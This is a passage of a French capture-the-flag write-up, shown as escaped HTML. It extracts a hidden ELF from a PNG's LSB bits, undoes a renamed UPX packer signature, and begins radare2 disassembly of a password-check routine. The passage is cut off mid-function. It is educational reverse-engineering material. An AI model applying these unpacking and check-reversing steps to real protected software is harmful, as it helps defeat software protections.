&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'lsb_RGB.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Done'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce script se charge de parcourir les pixels de l’image en colonne de haut en bas. Pour chaque pixel, on récupère le dernier bit des 3 composantes (RED, GREEN, BLUE). On construit ensuite un tableau d’octets (8 bits) sur lesquels on récupère leur caractère ASCII. Pour terminer, on enregistre tout ça dans le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;lsb_data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# autre manière de trouver les infos LSB&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zsteg &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ./lsb_RGB.png
...
b1,rgb,lsb,yx       .. text: &lt;span class=&quot;s2&quot;&gt;&quot;00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00000010: 0200 3e00 0100 0000 107f 4400 0000 0000  ..&amp;gt;.......D.....&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00000020
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ./lsb.py 
Start
Done
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file lsb_data 
lsb_data: ASCII text
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;lsb_data 
00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 107f 4400 0000 0000  ..&amp;gt;.......D.....
00000020: 4000 0000 0000 0000 0000 0000 0000 0000  @...............
00000030: 0000 0000 4000 3800 0200 4000 0000 0000  ....@.8...@.....
00000040: 0100 0000 0500 0000 0000 0000 0000 0000  ................
00000050: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....
00000060: 2487 0400 0000 0000 2487 0400 0000 0000  &lt;span class=&quot;nv&quot;&gt;$.&lt;/span&gt;......&lt;span class=&quot;nv&quot;&gt;$.&lt;/span&gt;......
00000070: 0000 2000 0000 0000 0100 0000 0600 0000  .. .............
00000080: 2854 0b00 0000 0000 2854 6b00 0000 0000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;T......&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Tk.....
00000090: 2854 6b00 0000 0000 0000 0000 0000 0000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Tk.............
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notre &lt;code class=&quot;highlighter-rouge&quot;&gt;lsb_data&lt;/code&gt; correspond à la vue d’un éditeur hex d’un binaire, plus précisément un &lt;code class=&quot;highlighter-rouge&quot;&gt;ELF&lt;/code&gt; (Executable and Linkable Format). La prochaine étape est sûrement d’extraire ce binaire et de l’analyser.&lt;/p&gt;

&lt;p&gt;Mais avant de continuer, on doit se rappeler que notre script python précédent va réaliser l’extraction des bits LSB sur &lt;strong&gt;TOUS&lt;/strong&gt; les pixels de l’image. Mais il y a de grande chance que notre extraction va trop loin. Essayons de voir cela en ouvrant &lt;code class=&quot;highlighter-rouge&quot;&gt;lsb_data&lt;/code&gt; avec &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 18592,18595p lsb_data
000489f0: 414c 4421 0d16 0807 f3b9 2205 c301 7d67  ALD!......&lt;span class=&quot;s2&quot;&gt;&quot;...}g # ligne 18592
00048a00: 0009 0000 9a02 0000 5044 0b00 4918 006b  ........PD..I..k # ligne 18593
00048a10: bc00 0000                                ....				# ligne 18594
q?Ð qdG/A§Ge¿{&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Üø&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;í÷Ö°Ú@¾ïÄt¤#&amp;amp;óP_WlòÛ&amp;lt;7_&amp;amp;f|á&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;ª						&lt;span class=&quot;c&quot;&gt;# ligne 18595&lt;/span&gt;
                                               oDî&lt;span class=&quot;nv&quot;&gt;$õ&lt;/span&gt;¬ËÕzµ&lt;span class=&quot;s1&quot;&gt;'ßØQ
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut donc voir que nous devons couper en ligne 18594 pour ne pas polluer notre extraction.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1,18594p lsb_data &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; lsb_data_clean
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;lsb_data_clean | less
00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 107f 4400 0000 0000  ..&amp;gt;.......D.....
00000020: 4000 0000 0000 0000 0000 0000 0000 0000  @...............
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons maintenant une vision en hex propre. Pour continuer nous devons extraire toutes les valeurs hexadécimal des colonnes du milieu. La colonne de gauche représente les positions des valeurs hexa et la colonne de droite, leur traduction ASCII, ces deux informations ne nous sont pas utiles, nous devons les retirer.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;lsb_data_clean | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f2-9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; lsb_data_clean_center
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; content &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsb_data_clean_center'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.read&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; clean_content &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; content.replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import binascii
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; final &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; binascii.unhexlify&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;clean_content&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'elf.bin'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file elf.bin
elf.bin: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, no section header
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x elf.bin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./elf.bin 
usage : ./elf.bin &amp;lt;mot de passe&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./elf.bin &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;Mauvais mot de passe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons maintenant le fichier caché dans le PNG, c’est un exécutable ELF qui prend en paramètre un mot de passe que nous devons sûrement trouver.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;reverse&quot;&gt;Reverse&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file elf.bin
elf.bin: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, no section header
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ./elf.bin
Process with PID 3036 started...
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; attach 3036 3036
bin.baddr 0x00400000
Using 0x400000
Warning: Cannot initialize section headers
Warning: Cannot initialize strings table
Warning: Cannot initialize dynamic strings
asm.bits 64
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x00447f10]&amp;gt; afl
0x00447f10    3 50           entry0
0x00447f80   28 203          fcn.00447f80
0x00448125   15 107  -&amp;gt; 230  fcn.00448125
0x00448190    3 38   -&amp;gt; 40   fcn.00448190
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut voir qu’il n’y a pas de &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; dans notre ELF, sûrement parce que ce dernier a été packé, il faut trouver le packer utilisé.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings ./elf.bin | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;upx
&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the ALD executable packer http://upx.sf.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On a donc à faire à un packer UPX, il faut réussir à le unpacker.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;upx &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ./elf.bin &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; elf_unpacked.bin
&lt;span class=&quot;c&quot;&gt;# -d: decompress&lt;/span&gt;
                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
upx: ./elf.bin: NotPackedException: not packed by UPX

Unpacked 0 files.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sauf que, &lt;code class=&quot;highlighter-rouge&quot;&gt;upx -d&lt;/code&gt; n’y arrive pas. La décompression ne fonctionne pas.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ./elf.bin | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; upx
&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the ALD executable packer http://upx.sf.net &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nous revenons à cette étape, on peut remarquer que l’URL &lt;code class=&quot;highlighter-rouge&quot;&gt;http://upx.sf.net&lt;/code&gt; correspond bien à une preuve d’UPX, mais il y a un problème sur &lt;code class=&quot;highlighter-rouge&quot;&gt;This file is packed with the ALD executable packer&lt;/code&gt;. En effet, à la place de &lt;code class=&quot;highlighter-rouge&quot;&gt;ALD&lt;/code&gt; on est censé avoir &lt;code class=&quot;highlighter-rouge&quot;&gt;UPX&lt;/code&gt;. Également, notre &lt;code class=&quot;highlighter-rouge&quot;&gt;grep -i upx&lt;/code&gt; est censé trouvé la chaîne &lt;code class=&quot;highlighter-rouge&quot;&gt;UPX!&lt;/code&gt; plusieurs fois.&lt;/p&gt;

&lt;p&gt;Après un peu de réflexion, peut-être que la chaîne &lt;code class=&quot;highlighter-rouge&quot;&gt;UPX&lt;/code&gt; a été remplacé par &lt;code class=&quot;highlighter-rouge&quot;&gt;ALD&lt;/code&gt; ?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; ./elf.bin | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ald
ALD! 
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;AlD
&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the ALD executable packer http://upx.sf.net &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$Id&lt;/span&gt;: ALD 3.91 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996-2013 the ALD Team. All Rights Reserved. &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
ALD!
ALD!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Donc oui, tous les &lt;code class=&quot;highlighter-rouge&quot;&gt;UPX&lt;/code&gt; ont été remplacé par des &lt;code class=&quot;highlighter-rouge&quot;&gt;ALD&lt;/code&gt;. Nous devons donc faire l’inverse pour continuer.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file elf.bin 
elf.bin: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, no section header
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;elf.bin | &lt;span class=&quot;nb&quot;&gt;sed &lt;/span&gt;s/ALD/UPX/g &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; elf_upx.bin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;upx &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ./elf_upx.bin &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ./elf_upx_unpacked.bin
&lt;span class=&quot;c&quot;&gt;# -d: decompress&lt;/span&gt;
                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
    738384 &amp;lt;-    297492   40.29%   linux/amd64   elf_upx_unpacked.bin

Unpacked 1 file.
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ./elf_upx_unpacked.bin 
./elf_upx_unpacked.bin: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;280771ce69bcde48b3a996331811768a49c7c120, stripped
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./elf_upx_unpacked.bin
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./elf_upx_unpacked.bin 
usage : ./elf_upx_unpacked.bin &amp;lt;mot de passe&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./elf_upx_unpacked.bin &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;Mauvais mot de passe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons donc réussi à décompresser (unpacker) notre &lt;code class=&quot;highlighter-rouge&quot;&gt;elf.bin&lt;/code&gt; en &lt;code class=&quot;highlighter-rouge&quot;&gt;elf_upx_unpacked&lt;/code&gt;. Nous pouvons maintenant commencer une analyse classique du binaire.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;$ r2 -d ./elf_upx_unpacked.bin
&amp;gt; aaaa
&amp;gt; afl
0x00400990    1 43           entry0
0x00400aae    9 114          sub.w0c__:_aae
0x00400b20    6 83           main
0x00401080   66 828          fcn.00401080
0x00407840    3 158          fcn.00407840
0x00408010   30 445  -&amp;gt; 417  fcn.00408010
0x004440f0  296 11505 -&amp;gt; 7157 sub.n_in_writable_segment_detected_f0
&amp;gt; s main
&amp;gt; pdf
/ (fcn) main 83
|   main (int arg2);
|           ; arg int arg2 @ rsi
|           ; DATA XREF from entry0 (0x4009ad)
|           0x00400b20      53             push rbx
|           0x00400b21      83ff01         cmp edi, 1                  ; 1
|       ,=&amp;lt; 0x00400b24      7e1f           jle 0x400b45 # on s'assure d'un argv[1]
|       |   0x00400b26      488b7e08       mov rdi, qword [rsi + 8]    ; arg2
|       |   0x00400b2a      e87fffffff     call sub.w0c__:_aae # appel de fonction
|       |   0x00400b2f      89c3           mov ebx, eax # on récupére une valeur de
|       |   0x00400b31      85c0           test eax, eax # retour qui va nous dire si mdp
|      ,==&amp;lt; 0x00400b33      752b           jne 0x400b60 # OK ou NOT OK
|      ||   0x00400b35      488d3d238d08.  lea rdi, qword str.Mauvais_mot_de_passe
|      ||   0x00400b3c      e8cf740000     call fcn.00408010 # NOT OK
|      ||   ; CODE XREFS from main (0x400b5e, 0x400b71)
|    ..---&amp;gt; 0x00400b41      89d8           mov eax, ebx
|    ::||   0x00400b43      5b             pop rbx
|    ::||   0x00400b44      c3             ret
|    ::||   ; CODE XREF from main (0x400b24) # si pas d'argument
|    ::|`-&amp;gt; 0x00400b45      488b36         mov rsi, qword [rsi]        ; arg2
|    ::|    0x00400b48      488d3df58c08.  lea rdi, qword str.usage_:__s__mot_de_passe
|    ::|    0x00400b4f      b800000000     mov eax, 0
|    ::|    0x00400b54      e8e76c0000     call fcn.00407840 # OK
|    ::|    0x00400b59      bb02000000     mov ebx, 2
|    `====&amp;lt; 0x00400b5e      ebe1           jmp 0x400b41
|     :|    ; CODE XREF from main (0x400b33)
|     :`--&amp;gt; 0x00400b60      488d3d118d08.  lea rdi, qword str.Bravo___Vous_pouvez_utiliser_ce_mot_passe_pour_la_suite
|     :     0x00400b67      e8a4740000     call fcn.00408010
|     :     0x00400b6c      bb00000000     mov ebx, 0
\     `===&amp;lt; 0x00400b71      ebce           jmp 0x400b41
&lt;/code&gt;&lt;/pre&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00400b20      53             push rbx
0x00400b21      83ff01         cmp edi, 1
0x00400b24      7e1f           jle 0x400b45 &lt;span class=&quot;c&quot;&gt;# on s'assure d'un argv[1]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Rapidement, on peut dire que notre programme s’assure de la présence d’un &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt;, si &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi &amp;lt;= 1&lt;/code&gt; alors on envoi le message d’erreur &lt;code class=&quot;highlighter-rouge&quot;&gt;usage: ./elf_upx_unpacked.bin &amp;lt;mot de passe&amp;gt;&lt;/code&gt; avec un &lt;code class=&quot;highlighter-rouge&quot;&gt;jle 0x400b45&lt;/code&gt;. Le registre &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; contient le nombre d’arguments du programme. Lorsque &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi = 0x00000001&lt;/code&gt; alors message d’erreur, lorsque &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi = 0x00000002&lt;/code&gt; on continu l’exécution.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;edi&lt;/code&gt; sont la même entité.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400b26      488b7e08       mov rdi, qword [rsi + 8]    ; arg2
0x00400b2a      e87fffffff     call sub.w0c__:_aae
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ensuite, on se charge de récupérer le &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; et d’appeler la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.w0c__:_aae&lt;/code&gt; juste derrière.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;0x00400b2a      e87fffffff     call sub.w0c__:_aae
0x00400b2f      89c3           mov ebx, eax 
0x00400b31      85c0           test eax, eax # test de la valeur de retour de la fonction
0x00400b33      752b           jne 0x400b60 # prise de décision succès ? ou échec ?
0x00400b35      488d3d238d08.  lea rdi, qword str.Mauvais_mot_de_passe # échec
0x00400b3c      e8cf740000     call fcn.00408010
0x00400b41      89d8           mov eax, ebx
0x00400b43      5b             pop rbx
0x00400b44      c3             ret
...
0x00400b60      488d3d118d08.  lea rdi, qword str.Bravo___Vous_pouvez_utiliser_ce_mot_passe_pour_la_suite # succès
0x00400b67      e8a4740000     call fcn.00408010
0x00400b6c      bb00000000     mov ebx, 0
0x00400b71      ebce           jmp 0x400b41
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On peut voir que cette fonction est très importante, en effet, c’est elle qui décide quel message afficher. Lors d’un succès, on affiche &lt;code class=&quot;highlighter-rouge&quot;&gt;Vous pouvez utiliser ce mot de passe pour la suite&lt;/code&gt; et lors d’un échec, on affiche &lt;code class=&quot;highlighter-rouge&quot;&gt;Mauvais mot de passe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous allons donc passer à l’analyse de la fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.w0c__:_aae&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;&amp;gt; s sub.w0c__:_aae
&amp;gt; pdf
/ (fcn) sub.w0c__:_aae 114
|   sub.w0c__:_aae (int arg1);
|           ; arg int arg1 @ rdi
|           ; CALL XREF from main (0x400b2a)
|           0x00400aae      4889fe         mov rsi, rdi                ; arg1
|           0x00400ab1      b800000000     mov eax, 0
|           0x00400ab6      48c7c1ffffff.  mov rcx, -1
|           0x00400abd      f2ae           repne scasb al, byte [rdi]
|           0x00400abf      b800000000     mov eax, 0
|           0x00400ac4      4883f9e0       cmp rcx, -0x20
|       ,=&amp;lt; 0x00400ac8      7402           je 0x400acc
|       |   ; CODE XREF from sub.w0c__:_aae (0x400b1e)
|      .--&amp;gt; 0x00400aca      f3c3           ret
|      :|   ; CODE XREF from sub.w0c__:_aae (0x400ac8)
|      :`-&amp;gt; 0x00400acc      0fb60e         movzx ecx, byte [rsi]
|      :    0x00400acf      84c9           test cl, cl
|      :,=&amp;lt; 0x00400ad1      7446           je 0x400b19
|      :|   0x00400ad3      488d15e68d08.  lea rdx, qword str.w0c__:   ; 0x4898c0 ; &quot;w0c&amp;amp;]:\x0e;\rM*\x1f.\x1f-O(Q7z\x14v x\x0f!M!l\x11&quot;
|      :|   0x00400ada      488d7e01       lea rdi, qword [rsi + 1]    ; r11
|      :|   0x00400ade      b801000000     mov eax, 1
|      :|   0x00400ae3      be33000000     mov esi, 0x33               ; '3' ; 51
|      :|   0x00400ae8      41b900000000   mov r9d, 0
|     ,===&amp;lt; 0x00400aee      eb16           jmp 0x400b06
|     |:|   ; CODE XREFS from sub.w0c__:_aae (0x400b0b, 0x400b15)
